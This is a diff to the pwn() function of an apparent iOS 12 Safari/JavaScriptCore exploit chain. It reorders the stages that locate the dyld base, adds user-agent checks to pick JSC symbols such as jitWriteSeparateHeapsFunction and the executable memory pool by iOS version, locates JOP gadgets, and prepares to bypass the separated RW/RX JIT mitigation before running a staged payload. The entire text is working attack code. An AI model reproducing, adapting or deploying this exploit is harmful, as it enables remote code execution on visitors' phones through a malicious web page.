@@ -645,27 +645,11 @@ function pwn() {
     log(`[+] Obtained other dylibs base.\n`);
 
 
-    // 3. Obtain func offsets from symbol name
-    log(`[Stage 3] Obtaining func offsets from symbol name...`);
 
-    var jsc_symbols = [
-        "___ZN3JSC29jitWriteSeparateHeapsFunctionE",    //iOS 12.0~12.5.x
-        "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv",    //iOS 12.2 or higher
-        "___ZN3JSC38taggedStartOfFixedExecutableMemoryPoolE", //iOS 12.1.x or lower
-        "___ZN3JSC36taggedEndOfFixedExecutableMemoryPoolE"  //iOS 12.1.x or lower
-    ];
-    var symbolsAddr = resolve_symbol_addresses(jsc_base, jsc_symbols);
-    var jitWriteSeparateHeaps_addr = symbolsAddr[0];
-    var startOfFixedExecutableMemoryPoolImpl_addr = symbolsAddr[1];
 
-    var memPoolStart = null;
-    var memPoolEnd = null;
-    if(symbolsAddr[2]) {
-        memPoolStart = read64(Add(jsc_base, symbolsAddr[2]));
-    }
-    if(symbolsAddr[3]) {
-        memPoolEnd = read64(Add(jsc_base, symbolsAddr[3]));
-    }
+
+    // 3. Obtain /usr/lib/dyld base...
+    log(`[Stage 3] Obtaining /usr/lib/dyld base...`);
 
     var libdyld_symbols = [
         "__dlsym",
@@ -674,6 +658,44 @@ function pwn() {
     symbolsAddr = resolve_symbol_addresses(libdyld_base, libdyld_symbols);
     var dlsym_addr = symbolsAddr[0];
     var dyld_process_info_notify_release_addr = symbolsAddr[1];
+    var dyld_base = obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr);
+    log(`[+] /usr/lib/dyld: ${dyld_base}`);
+    log(`[+] Obtained /usr/lib/dyld base.\n`);
+
+
+    // 4. Obtain func offsets from symbol name
+    log(`[Stage 4] Obtaining func offsets from symbol name...`);
+
+    var jitWriteSeparateHeaps_addr = null;
+    var startOfFixedExecutableMemoryPoolImpl_addr = null;
+    var memPoolStart = null;
+    var memPoolEnd = null;
+
+    var isOld12 = false;
+    if(navigator.userAgent.match(/OS 12_1(_\d+)?/) || navigator.userAgent.match(/OS 12_0(_\d+)?/)) {
+        isOld12 = true;
+    }
+    if(isOld12) {
+        var jsc_symbols = [
+            "___ZN3JSC29jitWriteSeparateHeapsFunctionE",    //iOS 12.0~12.5.x
+            "___ZN3JSC38taggedStartOfFixedExecutableMemoryPoolE", //iOS 12.1.x or lower
+            "___ZN3JSC36taggedEndOfFixedExecutableMemoryPoolE"  //iOS 12.1.x or lower
+        ];
+
+        var symbolsAddr = resolve_symbol_addresses(jsc_base, jsc_symbols);
+        jitWriteSeparateHeaps_addr = symbolsAddr[0];
+        memPoolStart = read64(Add(jsc_base, symbolsAddr[1]));
+        memPoolEnd = read64(Add(jsc_base, symbolsAddr[2]));
+    }
+    else {
+        var jsc_symbols = [
+            "___ZN3JSC29jitWriteSeparateHeapsFunctionE",    //iOS 12.0~12.5.x
+            "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv",    //iOS 12.2 or higher
+        ];
+        var symbolsAddr = resolve_symbol_addresses(jsc_base, jsc_symbols);
+        jitWriteSeparateHeaps_addr = symbolsAddr[0];
+        startOfFixedExecutableMemoryPoolImpl_addr = symbolsAddr[1];
+    }
 
     var libsysplatform_symbols = [
         "___longjmp"
@@ -718,8 +740,9 @@ function pwn() {
     var znkst3_addr = symbolsAddr[1];
     log(`[+] Obtained func offsets.\n`);
 
-    // 4. Find gadgets for code execution...
-    log(`[Stage 4] Finding JOP gadgets for code execution...`);
+
+    // 5. Find gadgets for code execution...
+    log(`[Stage 5] Finding JOP gadgets for code execution...`);
     var stackloader = find_stackloader_gadget(libsystem_kernel_base, mach_vm_map_addr);
     log(`[+] stackloader gadget: ${stackloader}`);
     var ldrx8 = find_ldrx8_gadget(security_base, SSLGetPeerDomainName_addr);
@@ -733,12 +756,6 @@ function pwn() {
     log(`[+] Obtained JOP gadgets.\n`);
 
 
-    // 5. Obtain /usr/lib/dyld base...
-    log(`[Stage 5] Obtaining /usr/lib/dyld base...`);
-    var dyld_base = obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr);
-    log(`[+] /usr/lib/dyld: ${dyld_base}`);
-    log(`[+] Obtained /usr/lib/dyld base.\n`);
-
 
     //6. We've done here, get code execution
     alert("Building JOP chain, executing stages payload!");
@@ -746,7 +763,7 @@ function pwn() {
     
     // needed to bypass seperated RW, RX JIT mitigation
     
-    if(startOfFixedExecutableMemoryPoolImpl_addr) { //iOS 12.2 or later
+    if(!isOld12) { //iOS 12.2 or later
         var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
         __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
         log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
